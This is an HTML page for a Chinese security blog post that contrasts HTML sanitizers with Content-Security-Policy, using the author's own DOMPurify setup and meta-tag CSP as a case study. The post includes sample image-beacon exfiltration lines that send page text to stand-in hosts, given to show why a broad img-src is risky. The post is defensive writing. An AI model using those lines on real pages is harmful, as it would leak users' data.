@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+<head>
+  <script>document.documentElement.classList.add("js");try{const t=localStorage.getItem("theme");if(t)document.documentElement.setAttribute("data-theme",t);}catch(e){}</script>
+    <meta charset="UTF-8">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://static.cloudflareinsights.com https://loczb-comments.billycust716.workers.dev; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self' https://loczb-comments.billycust716.workers.dev https://dashscope.aliyuncs.com https://709527.xyz https://www.709527.xyz https://cloudflareinsights.com; media-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests">
+    <script>/* 反点击劫持兜底：GitHub Pages 无法下发 X-Frame-Options / CSP frame-ancestors */(function(){if(self===top)return;try{top.location=self.location}catch(e){}setTimeout(function(){if(self!==top){document.documentElement.style.display='none';}},400);})();</script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>净化器不是防线，是过滤器：渲染第三方内容的两道门 | 张小猛 - loczb</title>
+    <meta name="description" content="净化只能降低已知 payload 命中的概率，它是过滤器；CSP 才决定被绕过之后对方能拿走什么。拿我自己站上那套 DOMPurify 加 meta 版 CSP 复盘。">
+
+    <!-- Open Graph -->
+    <meta property="og:title" content="净化器不是防线，是过滤器：渲染第三方内容的两道门 | 张小猛 - loczb">
+    <meta property="og:description" content="净化只能降低已知 payload 命中的概率，它是过滤器；CSP 才决定被绕过之后对方能拿走什么。拿我自己站上那套 DOMPurify 加 meta 版 CSP 复盘。">
+    <meta property="og:url" content="https://709527.xyz/blog/posts/sanitizer-is-a-filter-not-a-defense.html">
+    <meta property="og:type" content="article">
+    <meta property="og:image" content="https://709527.xyz/assets/images/og-image.png">
+    <meta property="og:site_name" content="loczb">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="净化器不是防线，是过滤器：渲染第三方内容的两道门 | 张小猛 - loczb">
+    <meta name="twitter:description" content="净化只能降低已知 payload 命中的概率，它是过滤器；CSP 才决定被绕过之后对方能拿走什么。拿我自己站上那套 DOMPurify 加 meta 版 CSP 复盘。">
+    <meta name="twitter:image" content="https://709527.xyz/assets/images/og-image.png">
+
+        <script type="application/ld+json">
+{
+      "@context": "https://schema.org",
+      "@type": "Article",
+      "headline": "净化器不是防线，是过滤器：渲染第三方内容的两道门",
+      "description": "净化只能降低已知 payload 命中的概率，它是过滤器；CSP 才决定被绕过之后对方能拿走什么。拿我自己站上那套 DOMPurify 加 meta 版 CSP 复盘。",
+      "image": "https://709527.xyz/assets/images/og-image.png",
+      "author": {
+            "@type": "Person",
+            "name": "张小猛",
+            "url": "https://709527.xyz/about/"
+      },
+      "publisher": {
+            "@type": "Organization",
+            "name": "loczb",
+            "logo": {
+                  "@type": "ImageObject",
+                  "url": "https://709527.xyz/assets/images/favicon.svg"
+            }
+      },
+      "datePublished": "2026-10-26T18:20:00+08:00",
+      "dateModified": "2026-10-26T18:20:00+08:00",
+      "url": "https://709527.xyz/blog/posts/sanitizer-is-a-filter-not-a-defense.html",
+      "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https://709527.xyz/blog/posts/sanitizer-is-a-filter-not-a-defense.html"
+      },
+      "keywords": "XSS, CSP, 内容净化, Web 安全",
+      "articleSection": "安全",
+      "timeRequired": "PT16M",
+      "inLanguage": "zh-CN"
+}
+    </script>
+
+    <link rel="stylesheet" href="../../assets/css/style.css?v=c8e170d8f9">
+    <link rel="icon" type="image/svg+xml" href="../../assets/images/favicon.svg">
+    <link rel="alternate icon" href="../../assets/images/favicon.ico">
+    <link rel="canonical" href="https://709527.xyz/blog/posts/sanitizer-is-a-filter-not-a-defense.html">
+</head>
+<body>
+  <!-- PARTIAL:SKIP_LINK -->
+  <a href="#main-content" class="skip-link">跳至主要内容</a>
+  <!-- /PARTIAL:SKIP_LINK -->
+
+  <!-- Navigation -->
+<!-- PARTIAL:NAV -->
+  <nav class="nav">
+  <div class="nav-inner">
+    <a href="/" class="nav-logo">
+      loc<span>zb</span>
+    </a>
+    <button class="nav-toggle" aria-label="打开菜单" aria-expanded="false" aria-controls="nav-links-menu">
+      <span></span>
+      <span></span>
+      <span></span>
+    </button>
+    <div class="nav-overlay"></div>
+    <ul class="nav-links" id="nav-links-menu">
+      <li><a href="/" class="nav-link" data-nav="home">首页</a></li>
+      <li><a href="/projects/" class="nav-link" data-nav="projects">项目</a></li>
+      <li><a href="/blog/" class="nav-link active" data-nav="blog">博客</a></li>
+      <li><a href="/about/" class="nav-link" data-nav="about">关于</a></li>
+    </ul>
+    <button class="theme-toggle" aria-label="切换主题" title="切换亮/暗模式">
+      <svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <circle cx="12" cy="12" r="5"></circle>
+        <line x1="12" y1="1" x2="12" y2="3"></line>
+        <line x1="12" y1="21" x2="12" y2="23"></line>
+        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+        <line x1="1" y1="12" x2="3" y2="12"></line>
+        <line x1="21" y1="12" x2="23" y2="12"></line>
+        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+      </svg>
+      <svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+      </svg>
+    </button>
+  </div>
+</nav>
+  <!-- /PARTIAL:NAV -->
+  <main class="section" id="main-content" style="padding-bottom: 0; padding-top: var(--space-4xl);">
+    <div class="container container-narrow">
+      <a href="../index.html" class="back-link">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M19 12H5M12 19l-7-7 7-7"/>
+        </svg>
+        返回博客列表
+      </a>
+
+      <article class="post-content">
+        <h1>净化器不是防线，是过滤器：渲染第三方内容的两道门</h1>
+
+        <div class="post-meta">
+          <span class="meta-item"><span aria-hidden="true">📅</span> 2026-10-26 18:20:00</span>
+          <span class="meta-item"><span aria-hidden="true">⏱️</span> 16 min read</span>
+          <span class="meta-item"><span aria-hidden="true">👤</span> 张小猛</span>
+        </div>
+
+        <div class="post-tags">
+          <span class="tag">XSS</span>
+          <span class="tag">CSP</span>
+          <span class="tag">内容净化</span>
+          <span class="tag">Web 安全</span>
+        </div>
+
+        
+
+        <h2>先假设第一道门已经失守</h2>
+<p>评价一个净化器的常规问法是「它能不能挡住 XSS」。这个问题问偏了：它把净化器放在防线的位置上，然后去追问一道过滤网够不够密。过滤网永远有孔，问题不在于孔有多大，而在于孔外头是什么。</p>
+<p>换个起点：假设我今天写的那段 <code>DOMPurify.sanitize()</code> 已经失效了。它可能是漏了某个命名空间里的标签，可能是我自己加了 <code>ADD_ATTR</code> 把某个属性放行，可能是我在回退分支里手写的转义漏了一种上下文，也可能是这行代码压根没跑到。这个假设不需要理由——一个只在「认识的东西」上生效的组件，失守是时间问题，不是概率问题。</p>
+<p>从这里往下推，问题就变成另外几个：失守之后，注入的脚本能执行吗？能往哪里发请求？能读走什么？能改掉页面的哪一部分？这些问题净化器一个都答不了，它们在 CSP 的管辖范围里。</p>
+<p>两道门的分工，说清楚了就是一句话：<strong>第一道门降低「己方被命中的概率」，第二道门压缩「被命中之后的后果」。把这两件事混成一件事，结果就是只做前者——而我自己的站上，长期就是这个状态。</strong></p>
+<h3>净化器认识的是它解析过的那份字符串</h3>
+<p>净化器的工作方式可以概括成三步：解析、删掉不在名单上的东西、序列化回字符串。这三步都发生在<strong>它拿到的那份输入</strong>上，而不是浏览器最终执行的那份 DOM 上。</p>
+<p>这个区分在多数情况下看不出差别，因为多数输入就是一段普通 HTML。但只要浏览器对同一段字节的解析结果和净化器的解析结果不一致，中间那条缝就出现了——净化器看到的是一段死掉的文本，浏览器看到的是一棵活的、带事件处理器的树。</p>
+<h3>两次解析之间的缝隙</h3>
+<p>同一段字符被解析两次，是这类问题的总根源。净化器用的是自己的解析器，浏览器用的是自己的解析器，两边对畸形嵌套、未闭合标签、命名空间切换的处理并不保证一致。</p>
+<p>几个典型的分歧点：</p>
+<ul>
+<li><strong>未闭合标签的补齐位置</strong>：净化器认为某个标签在 A 处结束，浏览器把它补到了 B 处，被删掉的子节点因此换了父节点。</li>
+<li><strong>命名空间的切换</strong>：<code>&lt;svg&gt;</code> / <code>&lt;math&gt;</code> 里的元素名和属性名走另一套规则，同一个 <code>&lt;a&gt;</code> 在 HTML 命名空间和 SVG 命名空间下能做的事不同。</li>
+<li><strong>序列化后再解析的往返</strong>：净化器把 DOM 序列化成字符串的那一刻，某些实体编码、属性引号、注释边界会被重写，浏览器再解析时读到的语义可能与净化器判断时不同。</li>
+</ul>
+<p>这一类问题有个统称，叫 mXSS（mutation XSS）。不需要记这个名字，记住机制就够：<strong>净化之后再没有第二次解析，等于没有校验过第二次。</strong></p>
+<h3>上下文比 payload 更要紧</h3>
+<p>新手看 XSS 是看 payload 长什么样：有没有 <code>script</code>、有没有 <code>onerror</code>。老手看的是这段值被<strong>放进哪里</strong>。</p>
+<p>同一个字符串 <code>Tom &amp; Jerry &lt;b&gt;</code> 放在五个位置，需要五种不同的处理：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">落点</th>
+<th style="text-align: left;">需要的处理</th>
+<th style="text-align: left;">处理错了会怎样</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">HTML 文本节点</td>
+<td style="text-align: left;">转义 <code>&amp; &lt; &gt;</code></td>
+<td style="text-align: left;">标签被解析执行</td>
+</tr>
+<tr>
+<td style="text-align: left;">属性值（带引号）</td>
+<td style="text-align: left;">转义 <code>&amp; " '</code></td>
+<td style="text-align: left;">属性被提前闭合，注入新属性</td>
+</tr>
+<tr>
+<td style="text-align: left;">URL 的 href / src</td>
+<td style="text-align: left;">先校验 scheme，再做 URL 编码</td>
+<td style="text-align: left;"><code>javascript:</code> / <code>data:</code> 落地执行</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>&lt;script&gt;</code> 里的 JS 字符串</td>
+<td style="text-align: left;">用 JSON 序列化，不做 HTML 转义</td>
+<td style="text-align: left;">字符串提前闭合，代码注入</td>
+</tr>
+<tr>
+<td style="text-align: left;">内联 JSON（<code>application/json</code>）</td>
+<td style="text-align: left;"><code>&lt;</code> 转成 <code>\u003c</code></td>
+<td style="text-align: left;"><code>&lt;/script&gt;</code> 提前结束脚本块</td>
+</tr>
+</tbody>
+</table>
+<p>真正出事的往往不是「没净化」，是「在错误的上下文里净化」。把一段 HTML 净化得干干净净，然后拼进 <code>onclick="..."</code> 里，前面那份工作全部作废——属性上下文里，HTML 净化器认为安全的字符组合可能是可执行的 JS。</p>
+<h2>第一道门：净化器能做什么，不能做什么</h2>
+<p>先把能力边界划清楚，后面才好谈它失守之后的事。</p>
+<p><strong>它能做</strong>：</p>
+<ul>
+<li>把一段用户提交的 HTML 里不在白名单上的标签和属性删掉</li>
+<li>处理已知的畸形嵌套、编码变形、协议混淆</li>
+<li>提供一致的输出，让下游可以放心把它当 HTML 插入</li>
+</ul>
+<p><strong>它不能做</strong>：</p>
+<ul>
+<li>保证自己覆盖了所有解析差异（mXSS 是持续的军备赛道，不是已解决问题）</li>
+<li>保护非 HTML 的上下文——CSS、URL、JS 字符串、JSON、SVG 属性，各有各的规则</li>
+<li>在你把它用错位置时救场（净化了 A，拼进了 B）</li>
+<li>阻止一段<strong>合法</strong>的富文本干合法但你不想要的事：外链图片、自动加载的 iframe、超长文本撑爆布局</li>
+<li>在它自己没加载成功时存在</li>
+</ul>
+<p>最后一条不是理论问题，是加载顺序问题。前端按需 <code>import</code> 一个净化库，网络抖动、CDN 5xx、CSP 把它的源挡了，三种情况都会让 <code>DOMPurify</code> 是 <code>undefined</code>。这时候代码要么抛错整块功能挂掉，要么走回退。回退逻辑写得好不好，直接决定这扇门是有还是没有。</p>
+<h3>白名单比黑名单可靠的原因</h3>
+<p>黑名单的本质是「列举所有坏事」，而坏事是一个开放集合。攻击面在演化：新的标签组合、新的协议处理器、浏览器新实现的属性。黑名单只能追在已经发生过的事情后面。</p>
+<p>白名单反过来：列举所有<strong>允许</strong>的事，其余默认拒绝。集合是封闭的，新出现的东西天然被挡在外面，出问题的方式变成「某个已放行的东西被滥用」，范围可控。</p>
+<p>代价是白名单必须由人来维护，而人总会想放行一点东西。我在自己的评论组件里就干过这种事：为了让引用块里的代码能保留高亮，放行了 <code>class</code>；为了让图片能限制尺寸，放行了 <code>width</code> / <code>height</code>。每放行一个，白名单就向黑名单靠近一步。</p>
+<h3>五种上下文，五种转义</h3>
+<p>下面这段是我给自己写的备忘，不是可以直接抄的库，但它把「同一份数据要按落点分别处理」这件事固定下来了：</p>
+<pre><code class="language-js">// 五种落点，五种处理，不要互相替代
+const esc = {
+  // HTML 文本节点
+  text: (s) =&gt; s.replace(/&amp;/g, '&amp;amp;').replace(/&lt;/g, '&amp;lt;').replace(/&gt;/g, '&amp;gt;'),
+  // 双引号属性值
+  attr: (s) =&gt; esc.text(s).replace(/&quot;/g, '&amp;quot;').replace(/'/g, '&amp;#39;'),
+  // URL：先校验 scheme，再编码；只允许 http/https/mailto
+  url: (s) =&gt; {
+    const u = new URL(s, location.origin);
+    if (!['http:', 'https:', 'mailto:'].includes(u.protocol)) return '#';
+    return u.href.replace(/&quot;/g, '%22').replace(/&lt;/g, '%3C');
+  },
+  // 内联 JSON：把 &lt; 打成 \u003c，防 &lt;/script&gt; 提前闭合
+  json: (o) =&gt; JSON.stringify(o).replace(/&lt;/g, '\\u003c'),
+  // JS 字符串：交给 JSON.stringify，不要手写引号
+  js: (s) =&gt; JSON.stringify(s),
+};
+</code></pre>
+<p>这张表的价值不在代码，在于它会逼你在写模板字符串时先问一句「这个位置属于哪一种」。多数注入不是因为转义函数写错了，是因为那一步压根没做——<code>${nickname}</code> 直接拼进 <code>onclick</code> 属性，谁都想不到。</p>
+<h2>第二道门：CSP 的职责是把影响半径压小</h2>
+<p>CSP 常被误解成「防 XSS 的」。它防不住 XSS：注入点存在就是存在，标签就在 DOM 里。CSP 管的是<strong>这段被注入的代码能做什么</strong>。</p>
+<p>这个区别决定了两者的写法。想「防 XSS」的人会去堆净化规则；想「压半径」的人会去问：如果页面上出现了一段我不认识的脚本，它最坏能拿到什么？</p>
+<p>答案拆成四个方向：</p>
+<ol>
+<li><strong>能不能执行</strong>——<code>script-src</code></li>
+<li><strong>能不能带走数据</strong>——<code>connect-src</code>、<code>img-src</code>、<code>form-action</code>、<code>navigate-to</code></li>
+<li><strong>能不能加载外部资源替换我的界面</strong>——<code>object-src</code>、<code>frame-src</code>、<code>style-src</code></li>
+<li><strong>能不能改变我的相对路径解析和表单提交目标</strong>——<code>base-uri</code>、<code>form-action</code></li>
+</ol>
+<p>外加一个容易被忽略的：<strong>能不能引我的站做第三方嵌入</strong>——<code>frame-ancestors</code>，反过来的点击劫持方向。</p>
+<h3>script-src 才是那条真边界</h3>
+<p>一条有效的 <code>script-src</code> 要满足两件事：<strong>没有 <code>'unsafe-inline'</code>，外域是逐个列出的</strong>。</p>
+<p><code>'unsafe-inline'</code> 一出现，内联脚本就随便执行——注入的 <code>&lt;script&gt;</code> 是内联的，注入的 <code>onerror=</code> 属性处理器也是内联的。加了它，<code>script-src</code> 只剩一个作用：挡外部脚本源。对 XSS 来说，这个作用接近于零。</p>
+<p>没有 <code>'unsafe-inline'</code> 之后，页面里所有内联脚本都得带 <code>nonce</code> 或者 <code>hash</code>：</p>
+<pre><code class="language-http">Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' 'nonce-&lt;random-per-request&gt;' 'strict-dynamic' https://cdn.jsdelivr.net;
+  style-src 'self' 'nonce-&lt;random-per-request&gt;';
+  img-src 'self' data:;
+  connect-src 'self' https://&lt;workers-subdomain&gt;.workers.dev;
+  object-src 'none';
+  base-uri 'self';
+  form-action 'self';
+  frame-ancestors 'none';
+  require-trusted-types-for 'script'
+</code></pre>
+<p>这份是响应头形态的示意，<code>nonce</code> 每次请求随机生成、由服务端注进 <code>&lt;script&gt;</code> 标签。它的关键性质是：<strong>攻击者注入的 <code>&lt;script&gt;</code> 拿不到这个 nonce</strong>，所以即使注入成功，脚本也不执行。这才是「防线」该有的样子——不依赖攻击者猜不到，而依赖它拿不到凭证。</p>
+<h3>数据外泄的三个出口</h3>
+<p>脚本执行只是第一步。真正让一次 XSS 从「页面被改了个字」升级成「用户数据没了」的，是外发通道。CSP 在这里能卡三个口子：</p>
+<ul>
+<li><strong><code>connect-src</code></strong>：<code>fetch</code> / <code>XHR</code> / <code>WebSocket</code> / <code>sendBeacon</code>。默认 <code>'self'</code>，只放行确实需要的 API 域。</li>
+<li><strong><code>img-src</code></strong>：<code>new Image().src = 'https://evil/?' + data</code> 是最古老的外发手法，因为它不受 CORS 约束、不需要读响应、几乎不留痕迹。</li>
+<li><strong><code>form-action</code></strong>：一段注入的 <code>&lt;form&gt;</code> 可以把页面上的输入框内容 POST 到任意域。<code>form-action 'self'</code> 关掉这条路，且<strong>它不会被子页面的 <code>default-src</code> 继承覆盖</strong>，要单独写。</li>
+</ul>
+<p>还有一个变体：<code>&lt;a href&gt;</code> 加 <code>target</code> 触发的导航。老规范里有 <code>navigate-to</code>，落地情况不齐，能靠的是 <code>base-uri 'self'</code> 配合不做开放重定向。</p>
+<h3>与「阻止漏洞」无关的几条指令</h3>
+<p><code>object-src 'none'</code> 挡的是插件内容（Flash 时代遗留，现在还有 PDF、SVG 嵌入等载体）。<code>base-uri 'self'</code> 挡的是注入一个 <code>&lt;base href&gt;</code> 把你的相对路径全改到别的域上——这条特别隐蔽，因为它本身不执行任何代码，只是让后续所有 <code>src</code> / <code>href</code> 指向别处。</p>
+<p>这些指令的共同点是：<strong>它们不减少注入点，只减少注入之后的可用手段</strong>。这正是第二道门的定义。</p>
+<h2>我站上那套东西长什么样</h2>
+<p>我的站点是 GitHub Pages 上的纯静态站，评论区是一个 Cloudflare Worker 加一段前端组件：游客填昵称和内容，Worker 存下来，前端拉回来渲染。也就是说，页面上有一块区域，内容<strong>完全来自陌生人</strong>。</p>
+<p>这块区域的渲染逻辑，实际是这样的：</p>
+<pre><code class="language-js">// 延迟加载净化器；加载不到就走转义回退
+async function renderComment(raw, nickname, ts) {
+  let safe;
+  try {
+    const { default: DOMPurify } = await import(
+      'https://cdn.jsdelivr.net/npm/dompurify@3/dist/purify.es.mjs'
+    );
+    safe = DOMPurify.sanitize(raw, {
+      ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'code', 'pre', 'blockquote', 'a'],
+      ALLOWED_ATTR: ['href', 'title', 'class'],
+    });
+  } catch (e) {
+    // 净化器没加载成功：退到纯文本 + 转义
+    safe = escapeHtml(raw).replace(/\n/g, '&lt;br&gt;');
+  }
+
+  // 昵称、时间、data-author 都走同一个属性位转义
+  return `&lt;article class=&quot;c&quot; data-author=&quot;${escapeHtml(nickname)}&quot;&gt;
+&lt;header&gt;&lt;b&gt;${escapeHtml(nickname)}&lt;/b&gt;&lt;time&gt;${escapeHtml(ts)}&lt;/time&gt;&lt;/header&gt;
+&lt;div class=&quot;c-body&quot;&gt;${safe}&lt;/div&gt;
+&lt;/article&gt;`;
+}
+
+// 用 DOM 自带的转义，而不是手写正则
+function escapeHtml(s) {
+  const div = document.createElement('div');
+  div.textContent = String(s);
+  return div.innerHTML;
+}
+</code></pre>
+<p>这段代码有两处我认为是对的：<strong>回退路径不返回原始内容</strong>（净化失败就退到纯文本），<strong>属性位和老老实实做转义</strong>（<code>data-author</code> 这种位置最容易被忽略，因为它不显示给用户看，却能被 CSS 选择器和 JS 读到）。</p>
+<p>然后是这个站的 CSP。因为 GitHub Pages 不给自定义响应头，只能把 CSP 塞进 <code>&lt;meta http-equiv&gt;</code>：</p>
+<pre><code class="language-html">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;
+  default-src 'self';
+  script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net
+              https://static.cloudflareinsights.com
+              https://&lt;workers-subdomain&gt;.workers.dev;
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data: https:;
+  connect-src 'self' https://&lt;workers-subdomain&gt;.workers.dev;
+  object-src 'none';
+  base-uri 'self';
+  form-action 'self';
+  upgrade-insecure-requests&quot;&gt;
+</code></pre>
+<p>它看起来挺长，<code>object-src</code> / <code>base-uri</code> / <code>form-action</code> 都写了，<code>upgrade-insecure-requests</code> 也有。但下面这一段是本文真正的正文。</p>
+<h2>三处其实是摆设</h2>
+<h3><code>'unsafe-inline'</code> 让 script-src 近乎失效</h3>
+<p>我在 <code>script-src</code> 里放了 <code>'unsafe-inline'</code>。原因很实在：站点的模板里有几段内联脚本（主题切换、评论区初始化、阅读进度条），拆成外部文件成本不低，而 GitHub Pages 上没有服务端，生成 per-request nonce 这条路走不通。</p>
+<p>后果是明确的：<strong>注入的 <code>&lt;script&gt;</code> 和内联事件处理器都能执行</strong>。<code>script-src</code> 此时实际只剩下「外部脚本源白名单」这一个作用。任何绕过净化器的注入，在这里不会遇到第二道拦截。</p>
+<p>这是本文最该被记住的一条：<code>'unsafe-inline'</code> 不是「稍微削弱」，它把 <code>script-src</code> 从防线降级成了配置项。写了它，就不该再对外宣称「我们有 CSP 防 XSS」。</p>
+<h3><code>img-src https:</code> 是一条可用的外泄信道</h3>
+<p>我写了 <code>img-src 'self' data: https:</code>。当时的理由是评论里允许贴图，而图片可能来自任何图床，逐个列出域名不现实。</p>
+<p>问题是 <code>https:</code> 这个 scheme 通配等于<strong>放行整个公网</strong>。一段注入的脚本（无论是通过 <code>'unsafe-inline'</code> 还是别的路径进来的）可以用一张图片把数据带出去，手法就是 <code>new Image().src = 'https://collect.example.com/p?' + encodeURIComponent(document.querySelector('.c-body').innerText)</code>——不需要 CORS，不需要读响应，一个 <code>Image</code> 对象就够。</p>
+<p><code>connect-src 'self'</code> 拦不住它，因为走的是图片加载，不是 <code>fetch</code>。<code>form-action 'self'</code> 也拦不住，因为没有表单。</p>
+<p>这一条和上一条叠在一起才致命：前者让代码能跑，后者让代码能把东西拿走。两条单独看都像「可接受的折中」。</p>
+<h3>meta 版 CSP 里几条指令根本不生效</h3>
+<p>这一条我原来不知道，是查规范才发现的：<code>&lt;meta&gt;</code> 形态的 CSP <strong>只支持一部分指令</strong>。在 meta 里写这些是无效的，浏览器会忽略（并在控制台给一条警告）：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">指令</th>
+<th style="text-align: left;">meta 里是否生效</th>
+<th style="text-align: left;">原因</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>frame-ancestors</code></td>
+<td style="text-align: left;">不生效</td>
+<td style="text-align: left;">需要在文档创建前就确定，只能走响应头</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>report-uri</code> / <code>report-to</code></td>
+<td style="text-align: left;">不生效</td>
+<td style="text-align: left;">上报地址必须在文档加载前注册</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>sandbox</code></td>
+<td style="text-align: left;">不生效</td>
+<td style="text-align: left;">与文档的浏览上下文绑定，meta 到达太晚</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>upgrade-insecure-requests</code></td>
+<td style="text-align: left;">生效</td>
+<td style="text-align: left;">属文档级策略</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>default-src</code> / <code>script-src</code> / <code>img-src</code> 等</td>
+<td style="text-align: left;">生效</td>
+<td style="text-align: left;">属资源加载策略</td>
+</tr>
+</tbody>
+</table>
+<p>所以我这份 CSP 里确实没有 <code>frame-ancestors</code>——不是忘了写，是写了也没用，还会给人「已经防了点击劫持」的错觉。反过来说，这个站目前<strong>对点击劫持没有任何防护</strong>，因为 GitHub Pages 不给响应头，我没有别的地方能声明它。</p>
+<p>知道这件事之后，我对「我们加了 CSP」这句话的信任度下降了一档：一份配置里最容易被引用为「安全」的那几行，可能根本不参与判定。</p>
+<h3>还有一处我原来没想到：净化器自己是 CDN 来的</h3>
+<p><code>DOMPurify</code> 是从 <code>cdn.jsdelivr.net</code> 动态 <code>import</code> 的。这意味着<strong>净化器本身是第三方供应链的一部分</strong>：CDN 被投毒、包被劫持、版本被换成恶意构建，净化函数就变成了「把输入原样返回」甚至「顺手加一段 payload」。</p>
+<p>我在 <code>script-src</code> 里放行了这个 CDN，站点的信任边界因此延伸到它。这一层不是「配置写错了」，是架构选择带来的固有成本。能做的缓解有限：锁死版本号（我锁了主版本，还能更紧）、加 SRI（<code>import()</code> 的动态模块对 SRI 支持不齐）、或者干脆自己托管一份固定版本的副本。我目前选了最弱的那档。</p>
+<p>写这一段不是为了自证诚实，是因为它是「第一道门不可靠」的第五个理由，而前四个（解析差异、上下文错位、放行属性、加载失败）都还在代码里。</p>
+<h2>两道门怎么配合</h2>
+<p>把上面的东西收成可执行的顺序，我给自己定的规则是四条。</p>
+<h3>默认拒绝，例外逐条列出</h3>
+<p>白名单的方向不能反过来。CSP 里的每个放行项都该能回答「不放行会坏掉哪个功能」，答不上来的就删。我删过一次 <code>https://*.google-analytics.com</code>，因为那个统计脚本两个月前就不在页面上了，配置却留着。</p>
+<h3>report-only 起步，再收紧</h3>
+<p>先只上报不拦截，拿到真实流量里的违规清单，再按清单改代码，最后切到强制。这个顺序能避免「上线即白屏」：</p>
+<pre><code class="language-http">Content-Security-Policy-Report-Only:
+  default-src 'self';
+  script-src 'self' 'nonce-&lt;random&gt;';
+  report-to csp-endpoint
+
+# 稳定后去掉 -Report-Only，并把 report-to 保留一段时间看回落
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' 'nonce-&lt;random&gt;';
+  report-to csp-endpoint
+</code></pre>
+<h3>收紧的优先顺序</h3>
+<p>如果只能改一处，改 <code>script-src</code> 去掉 <code>'unsafe-inline'</code>。第二处是 <code>img-src</code> 收窄到具体域名。第三处才是补净化规则。</p>
+<p>这个顺序和直觉相反——直觉是先加固净化器。但净化器的收益是「降低命中概率」，CSP 的收益是「降低命中后的损失」，后者的期望收益更高，且不依赖于「攻击者比我们慢」。</p>
+<h3>别让回退路径成为唯一防线</h3>
+<p>我那套 <code>escapeHtml</code> 回退在功能上是正确的（<code>textContent</code> 再读 <code>innerHTML</code> 走的是浏览器自己的转义），但它有个隐含假设：<strong>只有净化器失败时才会走到这里</strong>。如果某天有人为了「让 Markdown 更好看」把回退改成「先 <code>innerHTML</code> 再修正」，这条路就变成了绕过净化的后门。回退分支要当成和主路径同等重要的代码来审。</p>
+<h2>判据：我会拿这几条问自己</h2>
+<p>不谈原则，谈能自查的问题。下面五条，任何一条答不上来，说明这道门是纸糊的：</p>
+<ol>
+<li><strong>注入点如果今天被绕过，页面上的脚本能不能执行？</strong> —— 去 CSP 里找 <code>'unsafe-inline'</code>，找到就是能。</li>
+<li><strong>执行之后，数据能发到哪里？</strong> —— 看 <code>img-src</code>、<code>connect-src</code>、<code>form-action</code>，有没有 scheme 通配（<code>https:</code>、<code>data:</code>）。</li>
+<li><strong>我这份 CSP 的每一条指令，在当前投放方式下真的生效吗？</strong> —— meta 形态下逐条对着规范核一遍，别把 <code>frame-ancestors</code> 当成已配置。</li>
+<li><strong>净化器的加载失败路径，返回的是什么？</strong> —— 是纯文本，还是原始内容，还是一段 <code>innerHTML</code>。</li>
+<li><strong>我放行的每一个标签和属性，是哪个功能逼出来的？</strong> —— 举不出功能的，就是在给白名单掺黑名单。</li>
+</ol>
+<p>补一条元问题：<strong>我能不能在不看代码的情况下，说出这个站点「最坏情况会丢什么」？</strong> 说不出来，说明两道门的边界都还没画清。</p>
+<h2>收束</h2>
+<p>我原来对这套东西的理解是「净化做好了就安全」。现在的位置是：净化该做，但它是<strong>过滤器</strong>——它的价值是让大多数噪音停在门外，让日志里的异常变少，让常见的扫描器扫不出东西。它不承诺边界，因为它只能对它认识的东西生效，而「认识」这件事的质量上限由攻击者的创造力决定。</p>
+<p>CSP 是<strong>防线</strong>，因为它不依赖「我认不认识这个 payload」。它只依赖一件事：这段代码有没有凭证（nonce / hash / 白名单源）。没有就不执行，有就执行——判定规则里不含「内容长什么样」。</p>
+<p>我站上现在的状态是：第一道门做得还行，第二道门有三处是摆设。这个状态不会因为写了一篇文章就变好，它得靠把那段内联脚本搬出去、把 <code>img-src</code> 收窄、把 CDN 上的净化器换成自托管。这些是工程量，不是认知问题。</p>
+<p>写下来是因为，把「过滤器」叫作「防线」这件事本身有代价：它会让人在配置项勾完之后停止追问，而追问恰好是唯一能发现「写了也没用」的方式。</p>
+
+        <!-- Related Static -->
+        <div class="related-posts">
+          <div class="related-posts-title">📌 相关文章</div>
+          <div class="related-posts-list">
+          <a class="related-post-card" href="personal-site-privacy-boundary.html">
+            <div class="related-post-card-title">仓库边界就是发布边界：一次静态站隐私自查复盘</div>
+            <div class="related-post-card-tags"><span>隐私</span><span>个人网站</span><span>发布边界</span></div>
+          </a>
+          <a class="related-post-card" href="https-tls13-deep-dive.html">
+            <div class="related-post-card-title">HTTPS 与 TLS 1.3 深度解析</div>
+            <div class="related-post-card-tags"><span>安全</span><span>HTTPS</span><span>TLS 1.3</span></div>
+          </a>
+          <a class="related-post-card" href="ssh-security-hardening.html">
+            <div class="related-post-card-title">云服务器 SSH 安全加固完整指南</div>
+            <div class="related-post-card-tags"><span>DevOps</span><span>安全</span><span>SSH</span></div>
+          </a>
+          </div>
+        </div>
+
